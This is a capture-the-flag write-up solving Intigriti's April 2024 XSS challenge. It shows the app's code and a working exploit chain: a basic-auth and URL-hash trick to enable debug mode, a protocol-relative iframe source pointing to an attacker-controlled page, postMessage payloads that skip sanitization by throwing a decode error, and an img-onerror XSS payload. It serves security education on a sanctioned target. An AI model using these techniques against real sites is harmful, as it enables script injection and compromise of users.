# Intigriti's April XSS challenge By kire_devs_hacks

## Foreword

So, I was at this year's GrafanaCON in Amsterdam and decided to stay a few days longer. But what do you do on lonely and bored nights, being in a city full of tulips? Obviously, you hack. After more than 2 years I gave this month's XSS challenge a try.

## Target

The challenge is hosted at https://challenge-0424.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1777325179414212904.

As stated on the challenge's page, we need to find a way to execute arbitrary javascript on the challenge page. However, there are a few rules and information:

```
Rules:
    This challenge runs from Monday the 8th of April until Monday the 15th of April, 11:59 PM UTC.
    First blood will be rewarded with a €100 swag voucher! In addition to First blood, out of all correct submissions, we will draw six winners on Tuesday, the 16th of April:
    Three randomly drawn correct submissions
    Three best write-ups
    Every winner gets a €50 swag voucher for our swag shop
    The winners will be announced on our Twitter profile.
    For every 100 likes, we'll add a tip to announcement tweet.
    Join our Discord to discuss the challenge!

The solution...
    Should leverage a cross site scripting vulnerability on this domain.
    Should alert document.domain.
    Shouldn't be self-XSS or related to MiTM attacks.
    Should NOT use another challenge on the intigriti.io domain.
    Should be reported at go.intigriti.com/submit-solution.
    Should require no user interaction. 
```

## Hints

Intigriti released 4 hints:

1.  > Credentials are so complex! The admin is getting frustrated. I think it's time to hash things out 😔
    https://twitter.com/intigriti/status/1777992255317463453

2.  > So many protocols to pick from, I can't decide! Time to abandon all protocols and go with the flow
    https://twitter.com/intigriti/status/1777992506719777076

3.  > The web developers said errors are bad. Do hackers agree?
    https://twitter.com/intigriti/status/1778425408687325656

4.  > Have you tried sending a message to the entire globe?
    https://twitter.com/intigriti/status/1778425652888170954

## Inspecting and understanding the challenge

The challenge is taking place at [https://challenge-0424.intigriti.io/challenge/welcome.html](https://challenge-0424.intigriti.io/challenge/welcome.html/). 
There are 3 obvious main sites:
  1. The `/challenge/welcome.html` page. Just a few words of welcoming with two links to the next pages.
  2. The `/private/play.html?gameId=/challenge/game_barspacer.html` page. Contains a game, and visually you can already see that this page is embedded in an iframe. The URL kind of gives it away, the `/challenge/game_barspacer.html` is embedded into the `/private/play.html` page.
  3. The `/challenge/docs.html` with just some docs how the communication between the frame and host is being handled. Not a big surprise it is using post messages.

## Inspecting the source code

Luckily we get access to the application's source code. It is a NodeJS application running the `express` HTTP server. `express` uses functions as middlewares and handlers. For example the following handler needs the `requireAuth` middleware to call the `next` callback:

```js
app.get('/private/play.html', requireAuth, (req, res, next) => {
  //[...]
});
```

The `requireAuth` middleware per se looks like this:

```js
function requireAuth(req, res, next) {
  console.log(req.headers.authorization);

  // signal basic auth to the browser
  res.header('WWW-Authenticate', 'Basic realm=admin');

  // username 'admin' with password 'debug' is enough though for now
  // just to keep the bots and hackers from stealing our stuff
  // we know our front end guys don't care about this and are probably going to hardcode credentials again
  // but at least it's not our responsibility now
  var auth = req.headers.authorization?.split(' ')[1];

  if (!auth) {
    if (!req.headers.authorization) {
      return res.send(401);
    }
  }

  var decoded = Buffer.from(auth, 'base64').toString();
  console.log(decoded);
  var splitted = decoded.split(':');
  var user = splitted[0];
  var password = splitted[1];

  if (user !== 'admin' || password !== 'debug') {
    return res.send(401);
  }

  next();
}
```

This function takes the `Authorization` header, base64 decodes it, splits it by `:` character and uses the first and second item as a comparison against `admin` and `debug`.

Going back to the frontend code, we see the `/challenge/js/code.js` as a main JavaScript file, that does most of the frontend logic.

For example it sets up the post message handler:

```js
function messageHandler(event) {
    // debugApp can not be true in prd since the query param is not allowed there
    // so this should keep us secure even from the most l33t of hackers
    if (event.source === gameFrame.contentWindow) {
        if (event.origin === window.origin || debugApp) {
            handleEvent(event);
        }
    }
}

function initListener() {
    window.addEventListener('message', messageHandler);
}
```

The handler does a `source` check, so if the message is coming from the embedded frame. Furthermore it does an `origin` check, unless the `debugApp` param is true. So, if `debugApp` is false, we will not be able to send messages crafted by the attacker.

Additionally, the only real XSS sink in the app is part of lines 86-88 of the `code.js` file:

```js
if (debugApp && gameFrame.src.startsWith(window.origin + '/challenge/game_debug.html')) {
    displayMessage('<textarea style="width: 100%;height: 400px;">' + message + '</textarea>');
}
```

The `displayMessage` function just sets the `innerHTML` of an element:

```js
function displayMessage(message) {
    messages.innerHTML = message;
}
```

Coming back to the sink: also here, the `debugApp` param needs to be `true`. Looking at the `init` function, we can see how `debugApp` is set:

```js
var parameters = getQueryParams();
if (parameters.debug === 'true') {
    window.debugApp = true;
} else {
    window.debugApp = false;
}
```

with `getQueryParams` being:

```js
function getQueryParams() {
    var result = {};

    // decode and strip the hash, we don't use it
    // those backend guys ALWAYS keep in the location.hash in the url instead of just stripping it
    // even though we asked them multiple times
    // these guys clearly don't know what they are doing
    var decodedUrlNoHash = decodeURIComponent(document.URL).replace(decodeURIComponent(location.hash), '');

    var queryStringSplitted = decodedUrlNoHash.split('?').filter(x => x);

    if (queryStringSplitted.length !== 2) {
        return result;
    }

    var params = queryStringSplitted[1].split('&');

    params.forEach(function (param) {
        var paramSplitted = param.split('=');
        result[paramSplitted[0]] = paramSplitted[1];
    });

    return result;
}
```

So, basically this function takes query parameters and returns them. But it is using `document.URL` and some magic about removing the `location.hash` instead of just using `location.search` in combination with `URLSearchParams`. So that is already sketchy. We can see the difference between `document.URL` and `window.location.href` for example after we clicked to the game page:

```
document.URL -> `https://admin:debug@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_debug.html`

window.location.href -> `https://challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_debug.html`
```

Anyway, if we just want to set the `debug` parameter to `true` using a query parameter, we get the following error:

```
sorry, not allowed on PRD
```

from the following code of the server:

```js
var debug = req.query.debug;
if (debug && ENVIRONMENT === 'PRD') {
  return res.send('sorry, not allowed on PRD');
}
```

We can not set `debug` to true via queryparameters, so we need to find a bypass for that. Given the weird parsing of queryparameters, and the knowledge about differences between `document.URL` and `window.location`, we get the hint to set parameters in the URL's `hash` fragment. But those are stripped away in the `getQueryParams`?

Well, looking closely, they are using `.replace(decodeURIComponent(location.hash), '');` not `replaceAll`. So only the first occurence of the `hash` value is stripped away. Given that we know how they use their auth, we can just set the same `hash` value after a second colon in the basic auth header.

https://admin:debug%3A%23%26debug%3Dtrue@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_debug.html#%26debug%3Dtrue

Since the URL will be decoded by the frontend code, the full URL contains `#%26debug%3Dtrue` twice and we can use parameters in the `location.hash` fragment - most importantly we can enable the `debugApp` without being detected service side.

Since messing with encoded parameters, hash fragment and password can be cumbersome, and we have a bypass for this already, I just commented out the removal of hashes in the `getQueryParams` function for now - that makes finding the next steps way easier.

The whole application also offers the `/challenge/game_debug.html` "game" - which is supposed to be used for debugging purposes. `game_debug` also contains a `getQueryParams` function, but here, hash values are not removed. So we can just pass values to this game, also using the hash. However, those values need to be double URL encoded now, and start with a question mark.
Additionally, `game_debug` allows us to send a postmessage to the main host with attacker controlled values:

```js
var params = getQueryParams();

parent.postMessage(
    {
        action: params.action,
        message: params.message,
        delayedMessage: params.delayedMessage,
        timeOut: parseInt(params.timeOut),
        nextGameId: params.nextGameId
    }, '*')
```

Remembering that with the `debugApp` being true, we bypass the `origin` check, we should be able to send a `gotoNextGame` action to the host and set out own `nextGameId`. The `gotoGame` method, that sets the `src` value of the `iframe` has a small check in place:

```js
function gotoGame(gameId) {
    // we want to prevent xss, so check that the url begins with a '/'
    // we do a more complicated server side check for this also, but just in case
    if (gameId.startsWith('/')) {
        // decode to prevent any weird url issues
        gameFrame.src = decodeURIComponent(gameId);
    } else {
        displayMessage('Invalid gameId')
    }
}
```

If the `gameId` does not start with `/` it will not set the `src`. However, you can simply spare the protocal and set external pages by that. So, with `gameId = "//evil.com"` we would change `src` to `evil.com` - or to an attacker controlled page.

With that, we are only left the last step - sending a message that would trigger the XSS. For that, lets look how the `handleEvent` method looks in total:

```js
function handleEvent(event) {
    var action = event.data.action;

    // every action can a pass a message that gets displayed immediately, so we have special logic for this
    if (debugApp) {
        message = JSON.stringify(event.data);
    } else if (typeof event.data.message === 'string') {
        message = event.data.message;
    } else {
        message = ''
    }

    // max message length: 100
    //message = message?.substring(0, 100);

    if (action === 'gotoNextGame') {
        var nextGameId = decodeURIComponent(event.data.nextGameId);
    }

    // technically not needed but can't hurt
    nextGameId = sanitize(nextGameId);

    // sanitize to prevent xss
    message = sanitize(message);

    // display the sanitized message, then move on
    displayMessage(message);

    // the caller can control how much we wait before doing something
    // so that he can create a async queue of messages that will be processed
    // default is 0
    var timeOut = event.data.timeOut || 0;
    setTimeout(() => {
        if (action === 'gotoNextGame') {
            gotoGame(nextGameId);
        } else if (action === 'ping') {
            gameFrame.contentWindow.postMessage('pong', '*');
        } else if (action === 'finished') {
            displayMessage('Thank you for playing!');
        } else if (action === 'displayDelayedMessage') {
            displayMessage(sanitize(event.data.delayedMessage));
        }

        // only do this if we are on DEV, with the hidden /game_debug iframe
        // this is useful for inspecting the postmessage
        // this stuff is complicated after all
        if (debugApp && gameFrame.src.startsWith(window.origin + '/challenge/game_debug.html')) {
            displayMessage('<textarea style="width: 100%;height: 400px;">' + message + '</textarea>');
        }
    }, timeOut);
}
```

The `message` is set as a global variable, and since `debugApp` is true, it will be the JSON stringified object of the whole post message.

After that, the `nextGameId` will be URL decoded and after that the `message` will be sanitized. It struck me a bit wild that `nextGameId` will always be URL decoded, but then I realised that it is intentionally. Because what happens if `decodeURIComponent` throws an error? `message` will keep being an unsanitized value, and since the `innerHTML` is set in an `setTimeout`, it can use the unsanitized `message` value.

For that, we only really need two post messages from our own controlled domain:

```js
parent.postMessage({ action: 'gotoNextGame', nextGameId: `//localhost:3000/challenge/game_debug.html`, timeOut: 1000 }, '*')
parent.postMessage({ action: 'gotoNextGame', message: `</textarea><img src=x onerror=alert(origin)>`, timeOut: 0, nextGameId: "%0?" }, '*')
```

The first message will set the `nextGameId` back to the challenge, since that is needed to display the message. However, it will set back after 1 second. The second message will trigger an error using the `nextGameId`, and includes the payload to break out of the `textarea`, with `</textarea>` and does include a simple XSS payload using an `img` tag.

Since fiddeling with encoding, hash and username is slightly complicated, I just used the following snipped to create the final URL:

```js
const base = new URL("https://challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_debug.html");

const gameDebugParams = encodeURIComponent(`?action=gotoNextGame&nextGameId=//pink-neely-4.tiiny.site`);
const mainParams = `&debug=true`;

base.hash = `${encodeURIComponent(gameDebugParams)}${encodeURIComponent(mainParams)}`;

base.username = `admin`;
base.password = `debug:${base.hash}`;

base.toString();
```

That leads to `https://admin:debug%3A%23%253Faction%253DgotoNextGame%2526nextGameId%253D%252F%252Fpink-neely-4.tiiny.site%26debug%3Dtrue@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_debug.html#%253Faction%253DgotoNextGame%2526nextGameId%253D%252F%252Fpink-neely-4.tiiny.site%26debug%3Dtrue`


